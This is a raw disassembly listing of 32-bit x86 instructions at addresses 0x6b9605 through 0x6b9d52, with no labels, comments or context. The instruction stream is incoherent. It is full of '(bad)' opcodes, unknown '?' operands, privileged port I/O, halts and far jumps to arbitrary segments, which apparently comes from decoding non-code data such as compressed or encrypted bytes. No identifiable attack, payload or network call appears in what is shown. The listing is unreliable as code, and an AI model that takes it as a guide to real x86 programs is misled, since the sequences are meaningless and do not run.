  6b9605:	scas   eax,DWORD PTR es:[edi]
  6b9606:	mov    esp,DWORD PTR [edx-0x26]
  6b9609:	add    eax,DWORD PTR [eax-0x7434eb55]
  6b960f:	aas    
  6b9610:	pop    ss
  6b9611:	repz or eax,0xae3a66a6
  6b9617:	mov    ah,0xac
  6b9619:	cs pop edx
  6b961b:	cs retf 
  6b961d:	inc    ebx
  6b961e:	lea    ecx,gs:[ecx*4-0x5e20dd04]
  6b9626:	outs   dx,BYTE PTR ds:[esi]
  6b9627:	pushf  
  6b9628:	mov    ds:0x91288f51,al
  6b962d:	ss or  eax,0x76e49380
  6b9633:	bnd ja 0x6b960f
  6b9636:	mov    eax,ebp
  6b9638:	pop    edx
  6b9639:	mov    esp,0x3c335db8
  6b963e:	aaa    
  6b963f:	mov    dl,0x33
  6b9641:	sbb    DWORD PTR [eax+0x31],ebp
  6b9644:	adc    al,BYTE PTR [ecx+ebx*8]
  6b9647:	mov    ds:0x4fcaca8e,al
  6b964c:	arpl   WORD PTR [esi-0x202ccd46],si
  6b9652:	push   cs
  6b9653:	mov    esp,0xd8178146
  6b9658:	cmp    eax,0x3c0c497e
  6b965d:	fs retf 0x56ea
  6b9661:	lea    esp,[esi-0x6585a44d]
  6b9667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b9669:	ror    cl,1
  6b966b:	sub    eax,0x6b9095f1
  6b9670:	inc    eax
  6b9671:	test   eax,0x87db94a2
  6b9676:	mov    esi,?
  6b9678:	(bad)  
  6b9679:	aad    0xd9
  6b967b:	(bad)  
  6b967d:	hlt    
  6b967e:	hlt    
  6b967f:	lea    edx,[ebx]
  6b9681:	mov    ch,0xaf
  6b9683:	push   ebp
  6b9684:	push   edi
  6b9685:	fwait
  6b9686:	add    al,0xb
  6b9688:	or     DWORD PTR [eax+0x7b019493],esp
  6b968e:	(bad)  [esi-0x4a]
  6b9691:	xlat   BYTE PTR ds:[ebx]
  6b9692:	pushf  
  6b9693:	je     0x6b9658
  6b9695:	fadd   DWORD PTR [edx-0x1a6fb094]
  6b969b:	xchg   esp,eax
  6b969c:	pop    ebp
  6b969d:	xchg   edi,eax
  6b969e:	daa    
  6b969f:	mov    al,ds:0x98fb05f6
  6b96a4:	adc    eax,0xc52d50c4
  6b96a9:	idiv   DWORD PTR [esi-0x524e6851]
  6b96af:	ret    
  6b96b0:	xor    al,0x70
  6b96b2:	mov    esi,?
  6b96b4:	mov    DWORD PTR [ebx],edx
  6b96b6:	push   ebx
  6b96b7:	adc    dl,BYTE PTR [edx-0x12]
  6b96ba:	push   ebx
  6b96bb:	std    
  6b96bc:	push   0x883c810e
  6b96c1:	dec    eax
  6b96c2:	(bad)  
  6b96c3:	(bad)  
  6b96c5:	sti    
  6b96c6:	ja     0x6b968e
  6b96c8:	fadd   DWORD PTR [edi+0x49]
  6b96cb:	push   ss
  6b96cc:	jnp    0x6b96a8
  6b96ce:	pushf  
  6b96cf:	sub    DWORD PTR [esp+edx*2-0x48176bc6],0xb9bed9f4
  6b96da:	dec    esi
  6b96db:	cld    
  6b96dc:	pop    es
  6b96dd:	jl     0x6b9727
  6b96df:	pop    esp
  6b96e0:	retf   
  6b96e1:	sahf   
  6b96e2:	inc    esi
  6b96e3:	fsubr  DWORD PTR [eiz*8+0x548aa27e]
  6b96ea:	pop    ds
  6b96eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b96ec:	call   edx
  6b96ee:	fsub   DWORD PTR [eax-0x3c9f4f75]
  6b96f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b96f5:	test   BYTE PTR [edx],bh
  6b96f7:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  6b96f9:	push   ebx
  6b96fa:	or     al,dh
  6b96fc:	or     al,0xe8
  6b96fe:	enter  0x2b4a,0x82
  6b9702:	push   ebx
  6b9703:	pop    edi
  6b9704:	call   0xd49ee25c
  6b9709:	ins    BYTE PTR es:[edi],dx
  6b970a:	xchg   BYTE PTR [eax-0x3e9b6e7a],bh
  6b9710:	xchg   edi,eax
  6b9711:	pop    es
  6b9712:	rcr    DWORD PTR [edi],0x18
  6b9715:	jbe    0x6b96cc
  6b9717:	mov    al,ds:0x4319616c
  6b971c:	aaa    
  6b971d:	mov    DWORD PTR [ebx+0x77da702d],ebx
  6b9723:	or     DWORD PTR [esi],ebp
  6b9725:	leave  
  6b9726:	out    dx,al
  6b9727:	push   0x329db917
  6b972c:	fld    TBYTE PTR [ebx-0x4c]
  6b972f:	add    bh,BYTE PTR [edx+eax*1+0x5d7962e2]
  6b9736:	xchg   edi,eax
  6b9737:	or     ebx,DWORD PTR [ecx+0x3844b1c1]
  6b973d:	icebp  
  6b973e:	pop    edx
  6b973f:	scas   eax,DWORD PTR es:[edi]
  6b9740:	adc    BYTE PTR [esi+0x3c],0x30
  6b9744:	int    0xfb
  6b9746:	jns    0x6b978f
  6b9748:	inc    ecx
  6b9749:	pop    edi
  6b974a:	repz jb 0x6b96db
  6b974d:	in     eax,0x2a
  6b974f:	bound  ebp,QWORD PTR ds:0xe84409a4
  6b9755:	and    al,0xd7
  6b9757:	jp     0x6b9719
  6b9759:	popf   
  6b975a:	outs   dx,DWORD PTR ds:[esi]
  6b975b:	lods   al,BYTE PTR ds:[esi]
  6b975c:	cdq    
  6b975d:	cmc    
  6b975e:	int    0xe7
  6b9760:	and    BYTE PTR [eax+edx*4+0x54],dh
  6b9764:	outs   dx,DWORD PTR ds:[esi]
  6b9765:	ficomp DWORD PTR [bx+di+0x7a38]
  6b976a:	jno    0x6b9776
  6b976c:	daa    
  6b976d:	mov    esp,0x5c48ca2a
  6b9772:	mov    ch,0xd4
  6b9774:	inc    esi
  6b9775:	add    ecx,DWORD PTR [ecx]
  6b9777:	dec    esp
  6b9778:	inc    esi
  6b9779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b977a:	push   es
  6b977b:	cmp    al,0x6
  6b977d:	xlat   BYTE PTR ds:[ebx]
  6b977e:	pop    es
  6b977f:	outs   dx,BYTE PTR ds:[esi]
  6b9780:	in     eax,0x0
  6b9782:	push   ds
  6b9783:	in     al,dx
  6b9784:	in     al,0x54
  6b9786:	lahf   
  6b9787:	mov    al,ds:0x1134cc17
  6b978c:	xlat   BYTE PTR ds:[ebx]
  6b978d:	jae    0x6b97ce
  6b978f:	or     al,BYTE PTR [ebx-0x7efc468e]
  6b9795:	scas   al,BYTE PTR es:[edi]
  6b9796:	pop    ecx
  6b9797:	and    DWORD PTR [edx-0x37],eax
  6b979a:	cld    
  6b979b:	xchg   esp,eax
  6b979c:	(bad)  
  6b979d:	xchg   ebx,eax
  6b979e:	shr    DWORD PTR [ebx],0x45
  6b97a1:	push   ebp
  6b97a2:	xor    esp,eax
  6b97a4:	fs mov edx,0x8106e167
  6b97aa:	add    edi,DWORD PTR [edx+0x47cb4ac1]
  6b97b0:	adc    al,0x5a
  6b97b2:	xchg   edx,eax
  6b97b3:	std    
  6b97b4:	dec    ebx
  6b97b5:	jp     0x6b981c
  6b97b7:	fwait
  6b97b8:	push   0xffffffd4
  6b97ba:	xlat   BYTE PTR ds:[ebx]
  6b97bb:	push   ds
  6b97bc:	xor    BYTE PTR [edx],al
  6b97be:	stc    
  6b97bf:	aad    0x32
  6b97c1:	mov    ecx,0x1c9790e9
  6b97c6:	dec    edx
  6b97c7:	lock xchg BYTE PTR [esi-0x77f05060],dl
  6b97ce:	sbb    al,0x66
  6b97d0:	adc    ah,ah
  6b97d2:	dec    ecx
  6b97d3:	mov    al,BYTE PTR [edx]
  6b97d5:	push   ss
  6b97d6:	and    esp,edi
  6b97d8:	cmp    dl,BYTE PTR [eax-0x4d]
  6b97db:	aaa    
  6b97dc:	push   0x6b5e263a
  6b97e1:	icebp  
  6b97e2:	mov    edx,0xc3f8db67
  6b97e7:	inc    ecx
  6b97e8:	cmp    BYTE PTR [eax-0x724fceec],bl
  6b97ee:	sar    DWORD PTR [esi],1
  6b97f0:	mov    dl,0xb6
  6b97f2:	fbld   TBYTE PTR [edx]
  6b97f4:	pusha  
  6b97f5:	sub    al,0x13
  6b97f7:	add    eax,0xa91b53ba
  6b97fc:	add    eax,0x7eba98a3
  6b9801:	jb     0x6b97a1
  6b9803:	aaa    
  6b9804:	xor    ebp,DWORD PTR ds:0x34627d72
  6b980a:	cmp    esi,DWORD PTR [edi-0x31]
  6b980d:	sbb    esi,DWORD PTR [esi+0x5e]
  6b9810:	mov    dl,0x5c
  6b9812:	std    
  6b9813:	adc    al,0xa8
  6b9815:	mov    eax,0xf710161d
  6b981a:	mov    eax,fs
  6b981c:	xor    ch,dl
  6b981e:	iret   
  6b981f:	addr16 out 0x7a,al
  6b9822:	pusha  
  6b9823:	cs cmp bl,dh
  6b9826:	jmp    0x98647ee6
  6b982b:	dec    ebx
  6b982c:	add    DWORD PTR [ebx],ebx
  6b982e:	cwde   
  6b982f:	jmp    0xb53b599f
  6b9834:	popf   
  6b9835:	push   ebx
  6b9836:	dec    esp
  6b9837:	xor    al,0x25
  6b9839:	imul   ebx,DWORD PTR [esi-0x57],0x7fc48203
  6b9840:	xor    ebx,DWORD PTR [ebp-0x45]
  6b9843:	mov    edi,ebx
  6b9845:	dec    edx
  6b9846:	pop    eax
  6b9847:	repnz add eax,0xa94aaab0
  6b984d:	inc    edx
  6b984e:	jnp    0x6b9876
  6b9850:	jbe    0x6b98a3
  6b9852:	popa   
  6b9853:	test   eax,0x65991e88
  6b9858:	and    ecx,DWORD PTR [ebx+0x8]
  6b985b:	push   eax
  6b985c:	repz ret 
  6b985e:	addr16 ret 0x82ba
  6b9862:	add    DWORD PTR [esi+0x1c99e0d5],edi
  6b9868:	or     ah,BYTE PTR [ecx+0x72]
  6b986b:	aad    0x74
  6b986d:	push   esi
  6b986e:	dec    ebp
  6b986f:	mov    WORD PTR [ecx+0xa],ss
  6b9872:	(bad)  
  6b9873:	fisttp QWORD PTR [edx+0x23]
  6b9876:	or     BYTE PTR [edx],bl
  6b9878:	mov    bl,0xea
  6b987a:	push   ecx
  6b987b:	repz dec eax
  6b987d:	mov    esi,DWORD PTR [esi]
  6b987f:	outs   dx,BYTE PTR ds:[esi]
  6b9880:	xchg   ebx,eax
  6b9881:	pushf  
  6b9882:	push   ss
  6b9883:	mov    edx,0xa3531d9d
  6b9888:	ins    DWORD PTR es:[edi],dx
  6b9889:	test   eax,0x6f50190d
  6b988e:	imul   edi,DWORD PTR [ecx-0x6ae14b22],0xffffff8f
  6b9895:	adc    BYTE PTR [edx-0x5cf697d3],al
  6b989b:	adc    DWORD PTR [eax+0x59],ebx
  6b989e:	lahf   
  6b989f:	(bad)  
  6b98a0:	and    dl,dl
  6b98a2:	inc    ebp
  6b98a3:	js     0x6b9829
  6b98a5:	stc    
  6b98a6:	mov    dh,BYTE PTR [edi]
  6b98a8:	pop    esi
  6b98a9:	enter  0x4066,0xb0
  6b98ad:	sbb    dl,BYTE PTR [edi-0x5efeb56b]
  6b98b3:	popa   
  6b98b4:	test   BYTE PTR [edx-0x624bff41],ah
  6b98ba:	dec    esi
  6b98bb:	unpckhps xmm4,XMMWORD PTR [edi-0x2b]
  6b98bf:	sbb    esp,esi
  6b98c1:	imul   ecx,DWORD PTR [eax-0x3b],0xffffffa9
  6b98c5:	adc    eax,0x8b0f853a
  6b98ca:	mov    al,ds:0x69c06138
  6b98cf:	xor    eax,eax
  6b98d1:	imul   ebx,DWORD PTR [ebp-0x50],0xffffffb3
  6b98d5:	mov    DWORD PTR [ecx],edi
  6b98d7:	xor    esp,DWORD PTR [eax-0x60f4caf5]
  6b98dd:	sbb    eax,0xc675a2a7
  6b98e2:	cmp    DWORD PTR ds:0x9023df8b,esp
  6b98e8:	out    dx,eax
  6b98e9:	mul    eax
  6b98eb:	ffree  st(4)
  6b98ed:	mov    ebp,0x4f51279c
  6b98f2:	(bad)  
  6b98f3:	mov    es,WORD PTR [eax-0x1aef100c]
  6b98f9:	dec    ecx
  6b98fa:	out    0x30,al
  6b98fc:	stos   DWORD PTR es:[edi],eax
  6b98fd:	jne    0x6b98f7
  6b98ff:	mov    dh,0x94
  6b9901:	neg    DWORD PTR [eax]
  6b9903:	mov    ds:0xa4f519ce,eax
  6b9908:	dec    esp
  6b9909:	fiadd  WORD PTR [ebp+0xd]
  6b990c:	xchg   esp,eax
  6b990d:	shl    DWORD PTR [esi+0xa],0xd9
  6b9911:	cmp    DWORD PTR [ebp-0x5923eb90],eax
  6b9917:	sti    
  6b9918:	or     ch,BYTE PTR ds:[ebx-0x50]
  6b991c:	mov    esp,0xb50dc061
  6b9921:	lahf   
  6b9922:	xchg   ecx,eax
  6b9923:	fistp  WORD PTR [ecx-0x6f2d700b]
  6b9929:	pop    edx
  6b992a:	and    esi,DWORD PTR [esp+esi*2-0x2b1e0d4b]
  6b9931:	cmp    DWORD PTR [edi],eax
  6b9933:	dec    ebx
  6b9934:	cli    
  6b9935:	gs in  eax,0x68
  6b9938:	mov    BYTE PTR [ebp-0x1b4c3dbd],dh
  6b993e:	jmp    FWORD PTR [edx-0x7c]
  6b9941:	inc    ecx
  6b9942:	xchg   esi,eax
  6b9943:	not    DWORD PTR [ebx-0x31]
  6b9946:	in     eax,0xde
  6b9948:	ret    
  6b9949:	jmp    0x8751:0xd8c81179
  6b9950:	cwde   
  6b9951:	lods   al,BYTE PTR ds:[esi]
  6b9952:	and    DWORD PTR [edx],ecx
  6b9954:	mov    al,0xb
  6b9956:	adc    eax,0x80d7593c
  6b995b:	leave  
  6b995c:	cmp    edi,DWORD PTR [edi+0x3377676f]
  6b9962:	mov    bh,0x9
  6b9964:	jl     0x6b98f1
  6b9966:	bound  ecx,QWORD PTR [esi+0x6961e715]
  6b996c:	and    al,0xa0
  6b996e:	pop    eax
  6b996f:	cdq    
  6b9970:	push   es
  6b9971:	inc    ebp
  6b9972:	mov    ebx,0xfe2eb37
  6b9977:	mov    dh,ah
  6b9979:	sbb    eax,0xe1672226
  6b997e:	mov    eax,ds:0x9ca2c023
  6b9983:	popa   
  6b9984:	je     0x6b9929
  6b9986:	push   ds
  6b9987:	mov    eax,cs
  6b9989:	ss scas eax,DWORD PTR es:[edi]
  6b998b:	fidiv  DWORD PTR [edx+ebx*1]
  6b998e:	pop    ss
  6b998f:	xchg   esi,eax
  6b9990:	sbb    ah,BYTE PTR [eax]
  6b9992:	mov    cl,0x72
  6b9994:	dec    edi
  6b9995:	pop    ebp
  6b9996:	dec    ebp
  6b9997:	pop    esi
  6b9998:	int    0x8e
  6b999a:	cli    
  6b999b:	or     esp,DWORD PTR [esp+esi*1-0x436e932d]
  6b99a2:	or     al,0x7a
  6b99a4:	imul   edi,DWORD PTR [edx],0x0
  6b99a7:	popa   
  6b99a8:	push   cs
  6b99a9:	popf   
  6b99aa:	arpl   sp,bp
  6b99ac:	test   al,0x48
  6b99ae:	add    ebp,edi
  6b99b0:	and    eax,0x38384138
  6b99b5:	jb     0x6b99e3
  6b99b7:	xchg   ebx,eax
  6b99b8:	or     DWORD PTR ds:0xac0d03e2,edx
  6b99be:	or     eax,0x8124a538
  6b99c3:	pop    ecx
  6b99c4:	call   0x1a33440b
  6b99c9:	idiv   DWORD PTR [edx]
  6b99cb:	jmp    0x8a5187f6
  6b99d0:	push   esp
  6b99d1:	xor    al,0xc
  6b99d3:	or     BYTE PTR [ebp-0x4a],0x7e
  6b99d7:	addr16 sbb al,0xf2
  6b99da:	test   BYTE PTR [edx+esi*4-0x472dec63],ah
  6b99e1:	test   DWORD PTR [edx],ebx
  6b99e3:	fild   WORD PTR [ebp+0x2a78d6a0]
  6b99e9:	shl    bh,1
  6b99eb:	call   0x849f:0xb70d55fd
  6b99f2:	cmp    DWORD PTR [ebp+ebx*2-0x33],edx
  6b99f6:	jbe    0x6b9a09
  6b99f8:	sub    cl,0x14
  6b99fb:	(bad)  
  6b99fc:	push   eax
  6b99fd:	sub    dl,ch
  6b99ff:	fistp  DWORD PTR [ebp-0x326e064b]
  6b9a05:	jecxz  0x6b99f8
  6b9a07:	mov    ebp,edx
  6b9a09:	hlt    
  6b9a0a:	push   ebp
  6b9a0b:	ja     0x6b9a81
  6b9a0d:	inc    ebp
  6b9a0e:	frstor [edi-0xc]
  6b9a11:	gs xchg ecx,eax
  6b9a13:	pop    ebx
  6b9a14:	push   edi
  6b9a15:	jge    0x6b9a71
  6b9a17:	sbb    eax,0xcd0de6b2
  6b9a1c:	xor    DWORD PTR [edi-0x65c7c04a],esi
  6b9a22:	cdq    
  6b9a23:	shr    esp,1
  6b9a25:	mov    ah,0x32
  6b9a27:	sti    
  6b9a28:	pop    ds
  6b9a29:	loope  0x6b99fb
  6b9a2b:	int3   
  6b9a2c:	or     ecx,DWORD PTR [edi+ebp*1]
  6b9a2f:	out    dx,al
  6b9a30:	fild   DWORD PTR [edi+eiz*2-0x47]
  6b9a34:	lock and ebx,edi
  6b9a37:	dec    edx
  6b9a38:	bound  ecx,QWORD PTR [eax+0x19900690]
  6b9a3e:	retf   0x3d84
  6b9a41:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  6b9a43:	ins    BYTE PTR es:[edi],dx
  6b9a44:	or     ecx,DWORD PTR [eax+edx*1]
  6b9a47:	imul   BYTE PTR [edx+0x79]
  6b9a4a:	push   ss
  6b9a4b:	xor    al,0xde
  6b9a4d:	or     DWORD PTR ds:0xc85d621b,edx
  6b9a53:	scas   eax,DWORD PTR es:[edi]
  6b9a54:	std    
  6b9a55:	mov    ds:0xf39d5134,al
  6b9a5a:	jb     0x6b9a49
  6b9a5c:	or     eax,0xd3f3efc3
  6b9a61:	push   esi
  6b9a62:	lahf   
  6b9a63:	pop    edi
  6b9a64:	std    
  6b9a65:	sti    
  6b9a66:	pop    esi
  6b9a67:	out    0x63,eax
  6b9a69:	xor    al,0x99
  6b9a6b:	(bad)  
  6b9a6d:	jecxz  0x6b9a02
  6b9a6f:	fcomp  QWORD PTR [edx]
  6b9a71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b9a72:	fadd   st,st(5)
  6b9a74:	adc    DWORD PTR es:[edx+0x1e4f2782],0x7225fe41
  6b9a7f:	sbb    eax,0x4a57f23f
  6b9a84:	inc    edx
  6b9a85:	in     al,dx
  6b9a86:	sbb    eax,0x46f7bda
  6b9a8b:	inc    ecx
  6b9a8c:	ret    
  6b9a8d:	iret   
  6b9a8e:	jg     0x6b9adc
  6b9a90:	sbb    DWORD PTR [ebx+edi*1],0x42
  6b9a94:	(bad)  
  6b9a95:	jecxz  0x6b9b13
  6b9a97:	mov    ah,0x74
  6b9a99:	inc    esi
  6b9a9a:	repz mov ah,0x27
  6b9a9d:	lods   eax,DWORD PTR ds:[esi]
  6b9a9e:	dec    edx
  6b9a9f:	es inc esi
  6b9aa1:	enterw 0xc38e,0xce
  6b9aa6:	push   ebx
  6b9aa7:	(bad)  [esi-0x3f]
  6b9aaa:	cmp    BYTE PTR [ecx-0x66a63292],cl
  6b9ab0:	test   esp,eax
  6b9ab2:	mov    ?,ebp
  6b9ab4:	aas    
  6b9ab5:	loopne 0x6b9a44
  6b9ab7:	aas    
  6b9ab8:	cli    
  6b9ab9:	mov    esi,0xcff11707
  6b9abe:	mov    al,0x1c
  6b9ac0:	icebp  
  6b9ac1:	add    BYTE PTR [ebp-0x32a1db02],0x37
  6b9ac8:	jmp    0x6b9aea
  6b9aca:	ins    BYTE PTR es:[edi],dx
  6b9acb:	dec    ebx
  6b9acc:	cs dec ebx
  6b9ace:	je     0x6b9b26
  6b9ad0:	shr    DWORD PTR [ebx],0xef
  6b9ad3:	stos   BYTE PTR es:[edi],al
  6b9ad4:	xor    BYTE PTR [ebx-0x3a3e0aea],0xbf
  6b9adb:	rcr    DWORD PTR [ebp+0x31],cl
  6b9ade:	jbe    0x6b9a7a
  6b9ae0:	mov    ah,0x3f
  6b9ae2:	xor    DWORD PTR [esp+esi*4+0xe2f28b7],0xffffffc5
  6b9aea:	sbb    eax,0xee136c80
  6b9aef:	call   0xd996:0x31271cce
  6b9af6:	xor    BYTE PTR [esi],al
  6b9af8:	mov    eax,DWORD PTR ds:[ecx+ebp*4]
  6b9afc:	cmc    
  6b9afd:	arpl   WORD PTR [edi+0xc8438f7],bx
  6b9b03:	mov    ds:0x5137644f,al
  6b9b08:	retf   0xeffb
  6b9b0b:	xor    eax,0x622248a5
  6b9b10:	and    edx,ebp
  6b9b12:	fucomip st,st(5)
  6b9b14:	loopne 0x6b9b39
  6b9b16:	arpl   WORD PTR [ecx],bp
  6b9b18:	sub    eax,0xa6e2fbcd
  6b9b1d:	adc    al,ah
  6b9b1f:	jmp    0x69dc:0x899d1db3
  6b9b26:	lock push cs
  6b9b28:	and    al,0x9e
  6b9b2a:	mov    edi,0x532064e0
  6b9b2f:	(bad)  
  6b9b30:	mov    edx,0x3ce110a
  6b9b35:	inc    ecx
  6b9b36:	inc    ebp
  6b9b37:	cmp    ebx,ecx
  6b9b39:	jne    0x6b9adb
  6b9b3b:	inc    esi
  6b9b3c:	mov    ebx,0x7dcfa541
  6b9b41:	stos   BYTE PTR es:[edi],al
  6b9b42:	fld    QWORD PTR [edx+0x50dba524]
  6b9b48:	jbe    0x6b9bc4
  6b9b4a:	jmp    0xa0a70b3c
  6b9b4f:	loop   0x6b9ae1
  6b9b51:	ror    BYTE PTR [eax+edi*4+0x2c],cl
  6b9b55:	fimul  DWORD PTR [esi+eiz*4]
  6b9b58:	mov    al,0xa
  6b9b5a:	imul   edi,DWORD PTR [ebp-0x28f35758],0xffffffe7
  6b9b61:	or     DWORD PTR [ecx-0x57],ebx
  6b9b64:	es gs mov ebp,0x93c8346b
  6b9b6b:	les    esp,FWORD PTR [ebx+ebp*4]
  6b9b6e:	inc    esi
  6b9b6f:	add    DWORD PTR [eax-0x31110508],esp
  6b9b75:	sahf   
  6b9b76:	bswap  esi
  6b9b78:	mov    DWORD PTR [eax+0x47],eax
  6b9b7b:	call   0x14c8c63f
  6b9b80:	mov    cs,WORD PTR [ebx]
  6b9b82:	pop    ss
  6b9b83:	jmp    0x938cd64d
  6b9b88:	neg    DWORD PTR [eax+ebp*8]
  6b9b8b:	jae    0x6b9b4d
  6b9b8d:	fdivr  st,st(7)
  6b9b8f:	mov    DWORD PTR [eax+0x3705f42a],ebp
  6b9b95:	ss pushf 
  6b9b97:	cs jne 0x6b9b5b
  6b9b9a:	arpl   bp,bx
  6b9b9c:	pop    esp
  6b9b9d:	in     al,dx
  6b9b9e:	mov    edi,0x8f841070
  6b9ba3:	lea    esp,[esi+0x13074984]
  6b9ba9:	add    eax,eax
  6b9bab:	lahf   
  6b9bac:	sub    esi,DWORD PTR [ebp-0x65370a64]
  6b9bb2:	jmp    DWORD PTR [ebx]
  6b9bb4:	jb     0x6b9b9f
  6b9bb6:	lds    edi,FWORD PTR [ebx]
  6b9bb8:	adc    DWORD PTR [edx],edi
  6b9bba:	ds sahf 
  6b9bbc:	jbe    0x6b9b86
  6b9bbe:	inc    esi
  6b9bbf:	fwait
  6b9bc0:	pop    ss
  6b9bc1:	mov    ds:0x2a2e05e0,al
  6b9bc6:	call   0x975e:0x8905708a
  6b9bcd:	and    cl,ah
  6b9bcf:	scas   eax,DWORD PTR es:[edi]
  6b9bd0:	sub    DWORD PTR [edi],edx
  6b9bd2:	bound  eax,QWORD PTR [edi]
  6b9bd4:	out    dx,eax
  6b9bd5:	enter  0xf32b,0x7b
  6b9bd9:	into   
  6b9bda:	push   0x4c422bff
  6b9bdf:	or     al,0x16
  6b9be1:	or     al,0x36
  6b9be3:	inc    eax
  6b9be4:	stc    
  6b9be5:	mov    ch,0xb8
  6b9be7:	xor    DWORD PTR [edi],eax
  6b9be9:	cwde   
  6b9bea:	js     0x6b9bd4
  6b9bec:	shl    DWORD PTR [edx-0x1e],0xf8
  6b9bf0:	and    DWORD PTR [ebx],esp
  6b9bf2:	sub    esp,DWORD PTR [eax]
  6b9bf4:	jp     0x6b9c39
  6b9bf6:	push   0xffffffc9
  6b9bf8:	stos   DWORD PTR es:[edi],eax
  6b9bf9:	mov    ss,WORD PTR [eax+0x1e]
  6b9bfc:	or     cl,cl
  6b9bfe:	and    eax,0xd35d4e43
  6b9c03:	sub    dh,bl
  6b9c05:	aaa    
  6b9c06:	cmp    al,BYTE PTR [ecx+0x2872036c]
  6b9c0c:	out    0x58,al
  6b9c0e:	fisttp DWORD PTR [ebx]
  6b9c10:	in     al,0x79
  6b9c12:	fadd   QWORD PTR [ecx+0x183d9e3e]
  6b9c18:	test   BYTE PTR [edx],al
  6b9c1a:	jb     0x6b9c3d
  6b9c1c:	mov    BYTE PTR [ecx-0x2c],al
  6b9c1f:	inc    edx
  6b9c20:	call   0x7647c4e8
  6b9c25:	es push cs
  6b9c27:	shl    BYTE PTR [ebp+0x5],0x50
  6b9c2b:	arpl   WORD PTR [edi-0x2dea4e5e],si
  6b9c31:	inc    ebx
  6b9c32:	and    ebp,DWORD PTR [eax+0x1d]
  6b9c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b9c36:	mov    edi,0xcfe2f8f0
  6b9c3b:	neg    BYTE PTR [edx-0x50]
  6b9c3e:	lock mov ebp,0xac51cac8
  6b9c44:	xchg   edi,eax
  6b9c45:	adc    eax,0xbdbfcfab
  6b9c4a:	mov    bl,BYTE PTR [eax-0xf]
  6b9c4d:	mov    ah,0xaf
  6b9c4f:	out    0xaa,eax
  6b9c51:	push   0x2a80fc14
  6b9c56:	imul   edi,DWORD PTR [ebp-0x32941bf0],0xc58b67f8
  6b9c60:	sub    al,0xe8
  6b9c62:	aad    0x69
  6b9c64:	push   ss
  6b9c65:	mov    dh,0xf7
  6b9c67:	scas   eax,DWORD PTR es:[edi]
  6b9c68:	mov    ds:0x28a6e806,al
  6b9c6d:	mov    DWORD PTR [esi],0x3facefe3
  6b9c73:	test   al,0x4
  6b9c75:	lea    edi,[ebx+0x48]
  6b9c78:	sbb    eax,0xc8485260
  6b9c7d:	imul   ecx,DWORD PTR [esi+0x46546ccb],0x5b
  6b9c84:	mov    esp,DWORD PTR [edx+0x53]
  6b9c87:	mov    ebp,0xf4efb3bc
  6b9c8c:	fsub   DWORD PTR [ecx+0x3c]
  6b9c8f:	xchg   BYTE PTR [eax],cl
  6b9c91:	(bad)  [eax]
  6b9c93:	xchg   ecx,eax
  6b9c94:	and    eax,esp
  6b9c96:	data16 jae 0x6b9c43
  6b9c99:	dec    eax
  6b9c9a:	out    0x3f,al
  6b9c9c:	ds xor esi,edx
  6b9c9f:	ins    DWORD PTR es:[edi],dx
  6b9ca0:	lds    esp,FWORD PTR [eax]
  6b9ca2:	int3   
  6b9ca3:	and    eax,0xe2f7f002
  6b9ca8:	mov    es,eax
  6b9caa:	aaa    
  6b9cab:	test   al,0x7d
  6b9cad:	jp     0x6b9cd0
  6b9caf:	iret   
  6b9cb0:	push   ds
  6b9cb1:	inc    edx
  6b9cb2:	mov    dl,0xbb
  6b9cb4:	mov    cl,0x2f
  6b9cb6:	xchg   BYTE PTR [ecx-0x7c],bh
  6b9cb9:	fnstsw WORD PTR [edx+0x6c54c9a1]
  6b9cbf:	mov    ecx,0xb9ff51d7
  6b9cc4:	sbb    DWORD PTR [eax],ecx
  6b9cc6:	cwde   
  6b9cc7:	sub    dl,al
  6b9cc9:	pop    esp
  6b9cca:	dec    esi
  6b9ccb:	lds    ebp,FWORD PTR [ebx+0x6f]
  6b9cce:	scas   al,BYTE PTR es:[edi]
  6b9ccf:	inc    eax
  6b9cd0:	frstor [ebx+edx*4]
  6b9cd3:	adc    DWORD PTR [ebx],ebp
  6b9cd5:	aad    0x4d
  6b9cd7:	push   ds
  6b9cd8:	mov    al,ds:0x1cc92f66
  6b9cdd:	inc    edi
  6b9cde:	jp     0x6b9d29
  6b9ce0:	pop    ebp
  6b9ce1:	sti    
  6b9ce2:	mov    WORD PTR [ebp+0x3],?
  6b9ce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b9ce6:	das    
  6b9ce7:	inc    edx
  6b9ce8:	cmp    esi,0xffffffcb
  6b9ceb:	jp     0x6b9cf0
  6b9ced:	add    BYTE PTR [ecx+0x3],cl
  6b9cf0:	xchg   esp,eax
  6b9cf1:	mov    ebp,0x92dba587
  6b9cf6:	aad    0x4a
  6b9cf8:	ficomp DWORD PTR [ebp-0x33aecd6d]
  6b9cfe:	sbb    BYTE PTR [edi+ebp*1-0x1a],ch
  6b9d02:	fs push 0xce061956
  6b9d08:	cmp    al,0x8a
  6b9d0a:	div    DWORD PTR [esi+edi*4+0x4]
  6b9d0e:	fidiv  WORD PTR [edx+0x7e]
  6b9d11:	mov    ebp,0x1c58c9db
  6b9d16:	rcr    BYTE PTR ds:0x314e8f5d,1
  6b9d1c:	pop    esi
  6b9d1e:	(bad)  
  6b9d1f:	add    ecx,eax
  6b9d21:	je     0x6b9cfe
  6b9d23:	out    dx,eax
  6b9d24:	add    BYTE PTR [eax-0x4740b5ab],dl
  6b9d2a:	sub    al,BYTE PTR [eax+0x13]
  6b9d2d:	fisttp QWORD PTR [ebp+0x4faf97c0]
  6b9d33:	cmp    eax,0xdb168103
  6b9d38:	jl     0x6b9d61
  6b9d3a:	adc    dh,al
  6b9d3c:	cwde   
  6b9d3d:	aam    0x37
  6b9d3f:	out    0x84,eax
  6b9d41:	(bad)  
  6b9d42:	sub    al,0x95
  6b9d44:	jo     0x6b9d00
  6b9d46:	loopne 0x6b9d79
  6b9d48:	xor    bh,BYTE PTR [esi-0x7a]
  6b9d4b:	inc    edi
  6b9d4c:	pusha  
  6b9d4d:	mov    BYTE PTR [edx+0x74],cl
  6b9d50:	mov    eax,DWORD PTR [ecx]
  6b9d52:	hlt    
